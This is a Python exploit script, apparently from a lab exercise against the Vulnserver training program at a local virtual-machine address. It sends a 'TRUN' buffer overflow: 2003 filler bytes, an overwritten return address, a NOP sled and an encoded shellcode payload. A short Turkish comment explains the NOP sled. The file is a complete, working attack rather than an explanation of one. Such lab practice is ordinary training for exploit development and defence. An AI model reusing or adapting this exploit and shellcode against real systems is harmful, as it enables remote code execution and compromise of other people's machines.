import socket
import sys

#6250llaf

overflowPayload = ("\xbe\xdd\x67\x95\x9e\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x75\x12\x03\x75\x12\x83\x30\x9b\x77\x6b\x36\x8c\xfa"
"\x94\xc6\x4d\x9b\x1d\x23\x7c\x9b\x7a\x20\x2f\x2b\x08\x64\xdc"                                                                                                        
"\xc0\x5c\x9c\x57\xa4\x48\x93\xd0\x03\xaf\x9a\xe1\x38\x93\xbd"                                                                                                        
"\x61\x43\xc0\x1d\x5b\x8c\x15\x5c\x9c\xf1\xd4\x0c\x75\x7d\x4a"                                                                                                        
"\xa0\xf2\xcb\x57\x4b\x48\xdd\xdf\xa8\x19\xdc\xce\x7f\x11\x87"                                                                                                        
"\xd0\x7e\xf6\xb3\x58\x98\x1b\xf9\x13\x13\xef\x75\xa2\xf5\x21"                                                                                                        
"\x75\x09\x38\x8e\x84\x53\x7d\x29\x77\x26\x77\x49\x0a\x31\x4c"                                                                                                        
"\x33\xd0\xb4\x56\x93\x93\x6f\xb2\x25\x77\xe9\x31\x29\x3c\x7d"                                                                                                        
"\x1d\x2e\xc3\x52\x16\x4a\x48\x55\xf8\xda\x0a\x72\xdc\x87\xc9"                                                                                                        
"\x1b\x45\x62\xbf\x24\x95\xcd\x60\x81\xde\xe0\x75\xb8\xbd\x6c"                                                                                                        
"\xb9\xf1\x3d\x6d\xd5\x82\x4e\x5f\x7a\x39\xd8\xd3\xf3\xe7\x1f"                                                                                                        
"\x13\x2e\x5f\x8f\xea\xd1\xa0\x86\x28\x85\xf0\xb0\x99\xa6\x9a"                                                                                                        
"\x40\x25\x73\x0c\x10\x89\x2c\xed\xc0\x69\x9d\x85\x0a\x66\xc2"                                                                                                        
"\xb6\x35\xac\x6b\x5c\xcc\x27\x9e\xa1\xcc\xbd\xf6\xa3\xd0\xd0"                                                                                                        
"\x5a\x2d\x36\xb8\x72\x7b\xe1\x55\xea\x26\x79\xc7\xf3\xfc\x04"                                                                                                        
"\xc7\x78\xf3\xf9\x86\x88\x7e\xe9\x7f\x79\x35\x53\x29\x86\xe3"                                                                                                        
"\xfb\xb5\x15\x68\xfb\xb0\x05\x27\xac\x95\xf8\x3e\x38\x08\xa2"                                                                                                        
"\xe8\x5e\xd1\x32\xd2\xda\x0e\x87\xdd\xe3\xc3\xb3\xf9\xf3\x1d"                                                                                                        
"\x3b\x46\xa7\xf1\x6a\x10\x11\xb4\xc4\xd2\xcb\x6e\xba\xbc\x9b"                                                                                                        
"\xf7\xf0\x7e\xdd\xf7\xdc\x08\x01\x49\x89\x4c\x3e\x66\x5d\x59"                                                                                                        
"\x47\x9a\xfd\xa6\x92\x1e\x1d\x45\x36\x6b\xb6\xd0\xd3\xd6\xdb"                                                                                                        
"\xe2\x0e\x14\xe2\x60\xba\xe5\x11\x78\xcf\xe0\x5e\x3e\x3c\x99"                                                                                                        
"\xcf\xab\x42\x0e\xef\xf9")

stringToSend = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflowPayload
# overflowpayload ile kodumuz arasinda \x90 gibi is yapmayan bir no op(assembly code) sistemin calismasi icin daha mantiklidir.
try:
    mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    mySocket.connect(("10.0.2.15",9999))
    bytes = stringToSend.encode(encoding="latin1")
    mySocket.send(bytes)
    mySocket.close()

except Exception as e:
    print(e)
    sys.exit()